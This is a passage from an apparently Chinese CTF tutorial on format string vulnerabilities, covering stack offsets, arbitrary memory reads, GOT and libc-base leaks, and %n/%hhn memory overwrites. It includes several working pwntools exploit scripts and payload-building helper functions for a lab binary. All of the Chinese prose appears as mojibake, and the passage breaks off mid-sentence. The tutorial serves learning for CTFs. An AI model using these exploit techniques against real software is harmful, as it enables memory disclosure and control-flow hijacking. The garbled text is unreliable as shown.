ç»“å°¾å­—ç¬¦ä¸²ç›´åˆ°ç²¾åº¦è§„å®šçš„ä¸Šé™ï¼›å¦‚æœæ²¡æœ‰æŒ‡å®šç²¾åº¦ï¼Œåˆ™è¾“å‡ºæ‰€æœ‰å­—èŠ‚ã€‚ cï¼ŒæŠŠ int å‚æ•°è½¬ä¸º unsigned char å‹è¾“å‡º pï¼Œ void * å‹ï¼Œè¾“å‡ºå¯¹åº”å˜é‡çš„å€¼ã€‚printf(\"%p\",a) ç”¨åœ°å€çš„æ ¼å¼æ‰“å°å˜é‡ a çš„å€¼ï¼Œprintf(\"%p\", &amp;a) æ‰“å°å˜é‡ a æ‰€åœ¨çš„åœ°å€ã€‚ nï¼Œä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚ï¼ˆä»…ä»…æ˜¯åœ¨è¿™ä¸€ä¸ªprintfçš„å‡½æ•°ï¼‰ %ï¼Œ '%'å­—é¢å€¼ï¼Œä¸æ¥å—ä»»ä½• flags, widthã€‚ å‚æ•°ï¼šå°±æ˜¯æ˜¯è¦å¯¹åº”è¾“å‡ºçš„å˜é‡ã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ˜¯æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ¥è¿›è¡Œè§£æçš„ã€‚é‚£ä¹ˆç›¸åº”çš„è¦è¢«è§£æçš„å‚æ•°çš„ä¸ªæ•°ä¹Ÿè‡ªç„¶æ˜¯ç”±è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰€æ§åˆ¶ã€‚ æ ¹æ® cdecl çš„è°ƒç”¨çº¦å®š,åœ¨è¿›å…¥ printf() å‡½æ•°ä¹‹å‰,å°†å‚æ•°ä»å³åˆ°å·¦ä¾æ¬¡å‹æ ˆã€‚è¿›å…¥printf() ä¹‹å,å‡½æ•°é¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°,ä¸€æ¬¡è¯»å–ä¸€ä¸ªå­—ç¬¦ã€‚å¦‚æœå­—ç¬¦ä¸æ˜¯ % ,å­—ç¬¦ç›´æ¥å¤åˆ¶åˆ°è¾“å‡ºä¸­ã€‚å¦åˆ™,è¯»å–ä¸‹ä¸€ä¸ªéç©ºå­—ç¬¦,è·å–ç›¸åº”çš„å‚æ•°å¹¶è§£æè¾“å‡ºã€‚å¦‚ä¸Šå›¾ä¸€æ ·ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ä¸åé¢å®é™…æä¾›çš„æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå°±ä¸ä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤šåŠ å‡ ä¸ªæ ¼å¼åŒ–å­—ç¬¦çš„æ—¶å€™ï¼Œç¨‹åºä¼šæ€ä¹ˆåŠå‘¢ï¼Ÿæ­¤æ—¶å…¶å¯ä»¥æ­£å¸¸é€šè¿‡ç¼–è¯‘ï¼Œå¹¶ä¸”åœ¨æ ˆä¸Šå–å€¼ï¼ŒæŒ‰ç…§ç»™çš„æ ¼å¼åŒ–å­—ç¬¦æ¥è§£æå¯¹åº”æ ˆä¸Šçš„å€¼ã€‚æ­¤æ—¶ä¹Ÿå°±å‘ç”Ÿäº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ æ¼æ´åˆ©ç”¨æ³„éœ²å†…å­˜æ•°æ®æ ˆä¸Šçš„æ•°æ® åˆ©ç”¨ % order $ p / % order x æ¥è·å–æŒ‡å®šå‚æ•°å¯¹åº”æ ˆçš„å†…å­˜å€¼ ã€‚(å¸¸ç”¨%p) åˆ©ç”¨ % order $ s æ¥è·å–æŒ‡å®šå˜é‡æ‰€å¯¹åº”åœ°å€çš„å†…å®¹ï¼Œåªä¸è¿‡æœ‰é›¶æˆªæ–­ã€‚(è¿™ä¸ªåœ¨åšæŸäº›ctfé¢˜å¾ˆå¥½ç”¨ï¼Œå½“ä¸€ä¸ªç¨‹åºä¸Šæ¥è¯»å–ä¸€ä¸ªflagåˆ°ä¸€ä¸ªä½ç½®ï¼Œç„¶åä½ åœ¨æ ˆä¸Šæ„é€ è¿™ä¸ªä½ç½®ï¼Œç›´æ¥%så°±å‡ºæ¥flagäº†ã€‚)ä»»æ„åœ°å€å†…å­˜å½“æƒ³æ³„éœ²ä»»æ„åœ°å€å†…å­˜çš„æ—¶å€™ï¼Œå°±éœ€è¦æƒ³åŠæ³•æŠŠåœ°å€å†™å…¥æ ˆä¸­ã€‚åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹Ÿæ˜¯å­˜åœ¨æ ˆä¸Šçš„ï¼Œå½“å¯æ§çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥æŠŠæŸä¸ªåœ°å€å†™åˆ°è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸Šï¼Œç„¶åæ‰¾ä¸‹åœ¨è¿™ä¸ªprintfå‡½æ•°ä¸­å¯¹åº”çš„æ ˆåç§»ï¼Œç„¶ååœ¨ç”¨ä½ æƒ³ç”¨çš„æ ¼å¼åŒ–å­—ç¬¦ï¼ˆ%p/%x/%sï¼‰æ¥æ“ä½œå³å¯ã€‚ç„¶ååœ¨è¿™ä¸ªåœ°æ–¹ï¼Œå…¶æœ‰ä¸ªéš¾ç‚¹å°±æ˜¯æ‰¾å¯¹åº”çš„æ ˆåç§»ã€‚åœ¨æˆ‘ä»¬å®é™…ç”¨çš„æ—¶å€™ï¼Œå…¶å®å°±æ˜¯æ‰¾æ ˆä¸Šçš„æŸä¸ªä½ç½®å¯¹åº”è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ï¼Œå¹¶ä¸”ä¹Ÿåˆ†ä¸º32ä½äº64ä½ï¼Œå› ä¸ºå…¶ä¼ å‚æ˜¯ä¸ä¸€æ ·çš„ã€‚ç¡®å®šåç§»32ä½ è¿™æ˜¯32ä½çš„æ ˆå¯¹åº”æƒ…å†µï¼Œæ˜¯æ¯”è¾ƒå¥½ç†è§£çš„ã€‚å¦‚å›¾ï¼Œå¹¶ä¸”å‘ç°è¿™äº›æŒ‡å®šå‚æ•°çš„ï¼ˆå¦‚%4$x),å…¶å°±æ˜¯å¯¹åº”æ‰¾å¯¹åº”æ ˆä¸Šå†…å®¹ ï¼Œè€Œä¸æŒ‡å®šçš„%xå…¶æ‰¾å¯»æ‰¾çš„æ—¶å€™ï¼Œæ˜¯çœ‹ä¸‹å‰é¢æœ‰ä¸ªå‡ ä¸ªå¯¹åº”çš„æ— æŒ‡å®šæ ¼å¼åŒ–å­—ç¬¦ï¼Œå°±æƒ³å›¾ä¸Šçš„æƒ…å†µï¼Œå†ç»™ä¸€ä¸ª%xå…¶æ˜¯ä¼šæ‰¾åˆ°arg4ã€‚ 64ä½ï¿¼å› ä¸º64ä½çš„å‚æ•°å­˜æ”¾æ˜¯ä¼˜å…ˆå¯„å­˜å™¨(rdi,rsi,rdx,rcx,r8,r9)ï¼Œå æ»¡ä»¥åç¬¬7ä¸ªå‚æ•°æ‰ä¼šå­˜æ”¾åœ¨æ ˆä¸Šã€‚è¿™å°±æ˜¯è·Ÿ32ä½æ‰¾åç§»ä¸åŒåœ°æ–¹ã€‚ å°æŠ€å·§å¯ä»¥ç»™gdbå®‰è£…ä¸€ä¸‹pwndbgï¼Œåœ¨GitHubä¸Šé¢æ‰¾çš„åˆ°ã€‚ç„¶åæ¼”ç¤ºä¸€ä¸‹ï¼š #include &lt;stdio.h&gt; int main()&#123; setvbuf(stdout,0,2,0); char buf[100]; read(0,buf,99); printf(buf); &#125; gdbè°ƒè¯•ï¼Œæ‰¾å›¾ä¸­æ¡†æ¡†çš„æ ˆåœ°å€ï¼Œå¯¹åº”çš„åç§»ï¼š32ä½ï¼š64ä½ï¼š æ³¨æ„æ˜¯å¯¹åº”æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ã€‚ç”¨pwndbgçš„fmtargç¡®å®šåç§»ï¼Œå°±ä¸ç”¨æ‹…å¿ƒæ•°é”™äº†ã€‚ å†™åœ°å€è¿›æ ˆå­¦ä¼šç¡®å®šåç§»åï¼Œå°±å¯ä»¥å†™åœ°å€è¿›æ ˆï¼Œæ¥å®ç°è¯»ä»»æ„åœ°å€å†…å­˜äº†ã€‚ç»å¸¸ä½¿ç”¨çš„æ˜¯ï¼ŒæŠŠè¿™ä¸ªç¨‹åºä¸­çš„æŸä¸ªgotåœ°å€å†™è¿›æ ˆï¼Œç„¶åå°±å¯ä»¥äº†æ¥è·å–å…¶å†…å®¹ï¼Œç„¶ååœ¨æ ¹æ®å…¶åœ¨libcä¸­çš„åç§»å°±å¯ä»¥è®¡ç®—å‡ºlibcçš„åŸºå€ï¼Œè¿›è€Œç®—å‡ºä»»æ„ä¸€ä¸ªå‡½æ•°çš„åœ°å€ï¼ˆå¦‚systemï¼‰ã€‚ 32ä½ï¼šæ ¼å¼ï¼š&lt;address&gt;%&lt;order&gt;$sè¿™æ ·å°±å¯ä»¥å°è¯•è¯»å‡ºï¼Œadresså¤„å¯¹åº”çš„å€¼ï¼Œä½†æ˜¯å› ä¸ºæ˜¯%sï¼Œå…¶é‡åˆ°\\x00å°±ä¼šç›´æ¥æ–­äº†ï¼Œæ²¡æœ‰æƒ³è¦çš„è¾“å‡ºã€‚æ›´å¸¸æœ‰çš„æƒ…å†µå°±æ˜¯ï¼Œä¼šè¾“å‡ºä¸€å¤§å †ï¼Œç„¶åæˆ‘ä»¬æƒ³è¦çš„åœ°å€æºæ‚åœ¨é‡Œé¢ï¼Œæ‰€ä»¥å¯ä»¥æ”¹è¿›ä¸€ä¸‹ï¼Œå¯ä»¥åŠ ä¸€ç»„æ ‡è®°ï¼Œç„¶åå†å»å–å‡ºæ¥æƒ³è¦ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥æ¥æ£€æµ‹æ˜¯å¦è¢«\\x00æˆªæ–­äº†ã€‚æ”¹è¿›æ ¼å¼ï¼š&lt;address&gt;@@%&lt;order&gt;$s@@åœ¨ä½¿ç”¨çš„æ—¶å€™è®°å¾—é™¤å» &lt; &gt;ã€‚å®ä¾‹ï¼š gdb-peda$ got /media/psf/mypwn2/HITCON-Training-master/LAB/lab7/test: file format elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 08049ffc R_386_GLOB_DAT __gmon_start__ 0804a028 R_386_COPY stdout@@GLIBC_2.0 0804a00c R_386_JUMP_SLOT read@GLIBC_2.0 0804a010 R_386_JUMP_SLOT printf@GLIBC_2.0 0804a014 R_386_JUMP_SLOT __stack_chk_fail@GLIBC_2.4 0804a018 R_386_JUMP_SLOT __libc_start_main@GLIBC_2.0 0804a01c R_386_JUMP_SLOT setvbuf@GLIBC_2.0 è·å–ä¸€ä¸‹gotï¼Œé€‰æ‹©read ï¼š 0x0804a00c ,ç„¶åå€ŸåŠ©pwntoolsï¼š from pwn import * context.log_level = 'debug' io = process('./test') payload = p32(0x0804a00c) + '@@%6$s@@' # raw_input('-&gt;') io.sendline(payload) io.recvuntil('@@') print('leak-&gt;' +hex(u32(io.recv(4)))) io.interactive() å‘ç°å‡ºç°äº†å¼‚å¸¸ã€‚ä¿®æ”¹ä»£ç ï¼ŒæŸ¥ä¸€ä¸‹readåœ¨libcçš„symbolsï¼š from pwn import * context.log_level = 'debug' io = process('./test') elf = ELF('./test') libc = elf.libc payload = p32(0x0804a00c) + '@@%6$s@@' # raw_input('-&gt;') io.sendline(payload) io.recvuntil('@@') print('leak-&gt;' +hex(u32(io.recv(4)))) print('read-libc.symbols-&gt;' + hex(libc.symbols['read'])) io.interactive() å‘ç°å°±æ˜¯å› ä¸ºè¿æ°”ä¸å¥½ï¼Œè¿™ä¸ªlibcç‰ˆæœ¬é‡Œæ­£å¥½readå‡½æ•°æ˜¯00ç»“å°¾çš„ï¼Œæ‰€ä»¥æ¢ä¸€ä¸‹:Printf : 0x0804a010è¿™å°±å¯ä»¥äº†ï¼Œå¹¶ä¸”è¿˜å¯ä»¥çœ‹å‡ºæ¥çš„ç¡®æ˜¯è¾“å‡ºæ¥ä¸€å †ä¸œè¥¿ã€‚ 64ä½åœ¨64ä½ç¨‹åºå½“ä¸­ï¼Œä¸€ä¸ªåœ°å€çš„é«˜ä½å¿…å®šå°±æ˜¯0ï¼Œæ‰€ä»¥addressæ˜¯ä¸èƒ½å†™åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æœ€å‰é¢çš„ï¼Œå¯ä»¥è·Ÿåœ¨fmtåé¢ï¼Œä½†æ˜¯è¿™é‡Œå°±ç‰µæ¶‰åˆ°äº†å­—èŠ‚å¯¹é½é—®é¢˜ï¼Œå¹¶ä¸”å…¶åç§»é‡ç®—èµ·æ¥ï¼Œå½“æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åšpaddingæ—¶ï¼Œåç§»é‡æ—¶ä¼šå› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é•¿åº¦è€Œå‘ç”Ÿå˜åŒ–çš„ã€‚æ‰€ä»¥è¾ƒå¥½çš„åšæ³•ï¼Œå°±æ˜¯åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤„åšå¥½paddingï¼Œè¿™æ ·è§£å†³äº†å­—èŠ‚å¯¹é½ï¼Œä¹Ÿè§£å†³äº†åç§»é‡çš„è®¡ç®—ã€‚å®ä¾‹ï¼šï¼ˆè¿˜æ˜¯åˆšåˆšçš„ç¨‹åºç¼–è¯‘æˆ64ä½ï¼‰ payload = '@@%6$s@@'.ljust(0x28,'a') + p64(0x000000601020) è¿™æ¬¡æŠŠpayloadè¿™æ ·å†™ï¼Œåšå¥½paddingï¼ŒæŠŠaddresså†™åœ¨åé¢ï¼Œæ­¤æ—¶å› ä¸ºåç§»ä¼šå˜ï¼Œgdbè°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ï¼Œåç§»å˜ä¸ºå¤šå°‘ï¼šå¯ä»¥çœ‹å‡ºæ¥åç§»ä¸º11ã€‚å‘ç°å†æ¬¡è¿æ°”ä¸å¥½ï¼Œè¿˜æ˜¯å¾—æ¢ä¸€ä¸ªå‡½æ•°æ‰“å°gotï¼Œæ¢æˆreadï¼š from pwn import * context.log_level = 'debug' io = process('./test3') elf = ELF('./test3') libc = elf.libc payload = '@@%11$s@@'.ljust(0x28,'a') + p64(0x000000601028) raw_input('-&gt;') io.sendline(payload) io.recvuntil('@@') print('leak-&gt;' +hex(u64(io.recv(6).ljust(8,\"\\x00\")))) print('read-libc.symbols-&gt;' + hex(libc.symbols['read'])) io.interactive() è¿™æ ·å°±OKäº†ã€‚ å°æ€»ç»“ ä½¿ç”¨%s è¯»å–å†…å­˜é‡Œçš„ä»»æ„ä½å€ï¼Œ%s ä¼šæŠŠå¯¹åº”çš„å‚æ•°å½“åš char*æŒ‡æ ‡å¹¶å°†ç›®æ ‡åšä¸ºå­—ç¬¦ä¸²å°å‡ºæ¥ ä½¿ç”¨é™åˆ¶:Stack ä¸Šè¦æœ‰å¯æ§åˆ¶ addres çš„buffer ;æ³¨æ„ç”±äºæ˜¯å½“åšå­—ç¬¦ä¸²æ‰“å°ï¼Œæ‰€ä»¥åˆ° 0 æ—¶å°±ä¼šä¸­æ–­,ä¹Ÿè¦æ³¨æ„32ä½è·Ÿ64ä½addressçš„å†™åœ¨çš„ä½ç½®ã€‚å°æŠ€å·§0x1æƒ³è¦æ³„éœ²libcåŸºå€ï¼Œè¿˜æœ‰å°±æ˜¯é€šè¿‡è¿”å›__libc_start_main + x(libcç‰ˆæœ¬ä¸ä¸€æ ·å¯èƒ½ä¼šä¸ä¸€æ ·ï¼Œæœ¬äººæ˜¯ubuntu16.04)ç®—ä¸€ä¸‹åç§»æ˜¯21ã€‚from pwn import * context.log_level = 'debug' io = process('./test3') elf = ELF('./test3') libc = elf.libc payload = '%21$p'.ljust(0x8,'a') raw_input('-&gt;') io.sendline(payload) io.recvuntil('0x') libc_base = int(io.recv(12),16) - 240 - libc.symbols['__libc_start_main'] print('leak-&gt;' +hex(libc_base)) io.interactive() è¿è¡Œè¿™ä¸ªexpæ¥leak libcçš„åŸºå€ï¼šæˆåŠŸäº†ã€‚ 0x2æ³„éœ²stack address ï¼šæ­£å¦‚å›¾ä¸­æ‰€ç¤ºï¼Œä¼šå‘ç°æ ˆä¸Šè¯´æœ‰å¾ˆå¤šä¸espæ¥è¿‘çš„æ•°æ®ï¼Œåˆ©ç”¨åˆé€‚çš„æ•°æ®æ ¹æ®åç§»å°±ä¼šæ‹¿åˆ°espçš„å€¼ï¼Œç„¶åå°±å¾—åˆ°äº†satck addressã€‚å¸¸ç”¨çš„ä¹Ÿå°±æ˜¯å¤šå±‚å‡½æ•°è°ƒç”¨æ—¶ï¼Œç•™ä¸‹çš„ebpå€¼ã€‚ è¦†ç›–å†…å­˜è¦†ç›–å†…å­˜é€šå¸¸å…¶å®å°±æ˜¯æ”¹å†™å†…å­˜ï¼Œå…¶ä¸­åˆ†ä¸ºæ”¹å†™æ ˆä¸Šçš„å†…å­˜å’Œä»»æ„åœ°å€çš„å†…å­˜ï¼Œä»è€Œæ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ï¼ˆè¿™é‡Œæˆ‘å…ˆåªè®°å½•ä¸€ä¸‹ä»»æ„åœ°å€çš„è¦†ç›–ï¼Œæ”¹å†™æ ˆä¸Šçš„å†…å­˜æš‚æ—¶ç”¨ä¸åˆ°ï¼‰è¿™é‡Œé¢ä¸»è¦æ˜¯ä½¿ç”¨%n, %n è½¬æ¢æŒ‡ç¤ºç¬¦ä¸è¾“å‡ºå­—ç¬¦ï¼Œå°† å½“å‰printfå‡½æ•°å·²ç»æˆåŠŸå†™å…¥æµæˆ–ç¼“å†²åŒºä¸­çš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚å…¶æ ¸å¿ƒå°±æ˜¯ï¼šå†™å…¥çš„å€¼ = å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•° ï¼ŒçŸ¥é“è¿™ä¸ªä»¥åï¼Œå…¶ä½¿ç”¨èµ·æ¥å°±æ˜¯æ§åˆ¶å¥½åœ¨è¿™æ¬¡%nå‰è¾“å‡ºæ­£ç¡®çš„å­—ç¬¦æ•°ã€‚ ä»»æ„åœ°å€è¦†ç›– ä½¿ç”¨æ–¹æ³•ç±»ä¼¼äº%sçš„ä»»æ„åœ°å€è¯»å–ï¼Œåªæ˜¯æ¢æˆäº†%nã€‚ ä½¿ç”¨%xcçš„åŠæ³•æ¥æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°ã€‚åŸºæœ¬æ ¼å¼ï¼š ....[overwrite addr]....%[overwrite offset]$nå…¶ä¸­.... è¡¨ç¤ºæˆ‘ä»¬çš„å¡«å……å†…å®¹ï¼Œoverwrite addr è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ï¼Œoverwrite offset åœ°å€è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€å­˜å‚¨çš„ä½ç½®ä¸ºè¾“å‡ºå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¹Ÿå°±æ˜¯æ„é€ ä¸€ä¸ªéœ€è¦å†™å…¥çš„addressï¼Œç„¶åç”¨%xxcæ¥æ§åˆ¶å†™å…¥çš„å­—ç¬¦æ•°ï¼Œç„¶åæŠŠæ¡å¥½åç§»ã€‚ fmtå­—ç¬¦ä¸²å†™å…¥å¤§å°å› ä¸º%nåœ¨ä¸€æ¬¡çš„å†™å…¥æ˜¯åœ¨ä¸€æ¬¡å½“ä¸­å†™å…¥intå¤§å°çš„æ•´æ•°ï¼Œå½“ä½¿ç”¨%xcæ¥æ§åˆ¶è¾“å‡ºä¸€ä¸ªintå¤§å°çš„å­—ç¬¦ä¸ªæ•°ï¼Œè¿™ä¸ªprintfå‡½æ•°ä¼šè¾“å‡ºååˆ†å¤§çš„å­—ç¬¦æ•°é‡ï¼Œè¿™ä¸ªç»“æœå¯¹æˆ‘ä»¬è¯´ååˆ†ä¸åˆ©çš„ï¼Œä¸€æ–¹é¢è¿œç«¯ç¨‹åºè¾“å‡ºä»¥åï¼Œè‡ªå·±æ¥æ”¶æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œæ˜¯ååˆ†ä¸ç¨³å®šçš„ï¼Œå¹¶ä¸”æ— æ³•ç²¾å‡†çš„æ§åˆ¶éœ€è¦ä¿®æ”¹çš„åœ°æ–¹ã€‚æ‰€ä»¥å¸¸ç”¨çš„æ˜¯%hn å’Œ%hhnï¼Œåˆ†åˆ«å†™å…¥shortå’Œcharå¤§å°çš„æ•´æ•°ï¼Œç„¶ååˆ†æˆå¤šæ¬¡å†™å…¥ä»¥ç»„åˆæˆå®Œæ•´çš„intæ•´æ•°ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯ååˆ†ç¨³å®šçš„ã€‚ å•æ¬¡printfå¤šæ¬¡å†™å…¥åœ¨è¿›è¡ŒGOT hijackæˆ–è€…æ”¹æ‰æŸä¸€ä¸ªæŒ‡æ ‡çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šè¦æ±‚ä¸€æ¬¡printfå†…å°±è¦æ¥æ”¹å†™å®Œæˆï¼Œä¸ç„¶æ”¹ä¸€åŠçš„å€¼è¿™ä¸ªæŒ‡æ ‡å†è¢«ä½¿ç”¨æ—¶ç¨‹åºå¾ˆå®¹æ˜“å´©æºƒã€‚æ‰€ä»¥å°±å¯ä»¥æŠŠå¤šä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ç»“åˆåœ¨ä¸€æ¬¡ï¼Œä¾‹å¦‚ï¼š %xc%offset1$hn %yc%offset2$hn address address+2 ä½†è¿™æ ·å°±è¯´éœ€è¦å°å¿ƒåç§»ï¼Œå¹¶ä¸”è¾“å‡ºçš„å­—ç¬¦æ•°ä¹Ÿè¦æ§åˆ¶å¥½ã€‚éš¾ç‚¹ä¹Ÿåœ¨æ§åˆ¶è¿™ä¸ªå¤šæ¬¡å†™å…¥æ—¶ï¼Œcå‰é¢åº”è¯¥å¡«å¤šå°‘çš„å€¼ã€‚ å¤šæ¬¡å†™å…¥æ—¶æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°è¦æ³¨æ„çš„æ˜¯%nå†™å…¥çš„å€¼æ˜¯å…¶å‰é¢è¾“å‡ºçš„å­—ç¬¦æ•°ã€‚ ç¬¬ä¸€æ¬¡%xc%hhnçš„æ—¶å€™ï¼Œè¦æ‰£æ‰å‰é¢æ‘†æ”¾çš„addressçš„é•¿åº¦ã€‚æ¯”å¦‚32ä½æ—¶ï¼Œå…¶å‰é¢ä¼šæ‘†æ”¾4ä¸ªåœ°å€ï¼Œè¿™ä¸ªæ—¶å€™å°±æ˜¯xéœ€è¦å‡å»4x4 = 16. ä¹‹åæ¯ä¸ª%xc å¿…éœ€æ‰£æ‰å‰ä¸€ä¸ªå†™å…¥ byte çš„å€¼æ€»å­—ç¬¦æ•°æ‰ä¼šæ˜¯è¿™ä¸ªå†™å…¥éœ€è¦çš„é•¿åº¦ã€‚æ¯”å¦‚ ç¬¬ä¸€æ¬¡å†™å…¥å€¼ä¸º 90 ç¬¬äºŒä¸ªå†™å…¥ 120 æ­¤æ—¶åº”ä¸º%30c% offset$hhn å½“æŸä¸€æ¬¡å†™å…¥çš„å€¼æ¯”å‰é¢å†™å…¥çš„è¦å°çš„æ—¶å€™ï¼Œå°±éœ€è¦æ•´æ•°overflowå›æ¥ã€‚æ¯”å¦‚ï¼šéœ€è¦å†™å…¥çš„ä¸€ä¸ªå­—èŠ‚ï¼Œç”¨çš„æ˜¯hhnçš„æ—¶å€™ï¼Œå‰é¢é‚£æ¬¡å†™å…¥çš„æ˜¯0x80ï¼Œè¿™æ¬¡å†™å…¥çš„æ˜¯0x50ï¼Œè¿™æ—¶å€™å°±ç”¨0x50å¯ä»¥åŠ ä¸Š0x100ï¼ˆ256ï¼‰=0x150 ï¼ˆè¿™æ—¶å€™å› ä¸ºæ˜¯hhnï¼Œåœ¨æˆªå–çš„æ—¶å€™å°±æ˜¯æˆªå–çš„0x50ï¼‰ï¼Œ å†å‡å»0x80 = 0xD0ï¼ˆ208ï¼‰ï¼Œä¹Ÿå°±æ˜¯å¡«å…¥%208c%offset$hhnå³å¯ã€‚ å½“ç„¶è¿™ä¹Ÿæ˜¯å¾ˆè§„å¾‹çš„ï¼Œåœ¨æ§åˆ¶ä¸€ä¸ªè¾“å‡ºå­—ç¬¦æ•°ï¼Œå°±åˆ†ä¸º3ç§æƒ…å†µï¼š å‰é¢å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°å°äºè¿™æ¬¡è¦è¾“å‡ºçš„å­—ç¬¦æ•° å‰é¢å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°ç­‰äºäºè¿™æ¬¡è¦è¾“å‡ºçš„å­—ç¬¦æ•° å‰é¢å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°å¤§äºè¿™æ¬¡è¦è¾“å‡ºçš„å­—ç¬¦æ•° ç„¶åå°±å¯ä»¥å†™æˆä¸€ä¸ªè„šæœ¬æ¥å®ç°è‡ªåŠ¨åŒ–æ§åˆ¶è¿™ä¸ªè¾“å‡ºå­—ç¬¦æ•°ï¼š å•å­—èŠ‚ï¼š # prev å‰é¢å·²ç»è¾“å‡ºå¤šå°‘å­—ç¬¦ # val è¦å†™å…¥çš„å€¼ # idx åç§» def fmt_byte(prev,val,idx,byte = 1): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hhn\" return result #æ­é…ï¼š prev = 0 payload = \"\" # xå°±æ˜¯ä½ è¦å†™å…¥çš„å­—èŠ‚æ•°ï¼Œä¾‹å¦‚åœ¨æ”¹å†™64ä½gotæ—¶å¸¸ç”¨æ˜¯6ï¼Œå› ä¸ºå…¶å‰ä¸¤ä¸ªå­—èŠ‚éƒ½ä¸€æ · # idxæ˜¯åç§»ï¼Œkeyæ˜¯è¦å†™å…¥çš„ç›®æ ‡å€¼ for i in range(x): payload +=fmt_byte(prev,(key &gt;&gt; 8*i) &amp; 0xff,idx+i) prev = (key &gt;&gt; i*8) &amp; 0xff åŒå­—èŠ‚ï¼š #è·Ÿä¸Šä¸ªåŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯æ”¹äº†éƒ¨åˆ†åœ°æ–¹ def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 0 payload = \"\" for i in range(x): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,idx+i) prev = (key &gt;&gt; i*16) &amp; 0xffff åœ¨ä½¿ç”¨è¿™ä¸¤ä¸ªè„šæœ¬çš„æ—¶å€™ï¼Œå¸¸ç”¨çš„æ˜¯åœ¨è·å–åˆ°payloadçš„æ—¶å€™ä¹Ÿç”¨payload.ljust()åšå¥½padding,æ¥æ§åˆ¶å¥½å­—èŠ‚å¯¹é½ï¼Œç„¶åå†æ‘†ä¸Šéœ€è¦å†™å…¥xç»„çš„åœ°å€ã€‚ï¼ˆä¸€ä¼šåœ¨é¢˜ç›®ä¸­ä¼šæœ‰æ¼”ç¤ºï¼‰ pwntools pwnlib.fmtstr æ¨¡å—pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') offset (int):ä½ æ§åˆ¶çš„ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–ç¨‹åºçš„åç§»é‡ writes (dict):æ ¼å¼ä¸º {addr: value, addr2: value2},ç”¨äºå¾€ addr é‡Œå†™å…¥ value (å¸¸ç”¨:{printf_got}) numbwritten (int):å·²ç»ç”± printf å‡½æ•°å†™å…¥çš„å­—èŠ‚æ•° write_size (str):å¿…é¡»æ˜¯ byte,short æˆ– intã€‚é™åˆ¶ä½ æ˜¯è¦é€ byte å†™,é€ short å†™è¿˜æ˜¯é€ int å†™(hhn,hnæˆ–n) è¿™ä¸ªå‡½æ•°æ˜¯ååˆ†å¥½ç”¨çš„ï¼Œå…·ä½“å¯ä»¥å»çœ‹ä¸€ä¸‹pwntoolsçš„å®˜æ–¹ä»‹ç»ï¼Œä½†æ˜¯å®é™…ä½¿ç”¨å½“ä¸­ï¼Œä¼šå‘ç°å‡ ä¸ªé—®é¢˜ï¼š åœ¨64ä½ä¸­ï¼Œå¹¶ä¸å¥½ç”¨ï¼Œè‡ªåŠ¨ç”Ÿæˆçš„payloadä¸­ï¼Œå®ƒä¸ä¼šå°†åœ°å€æ”¾åœ¨æ 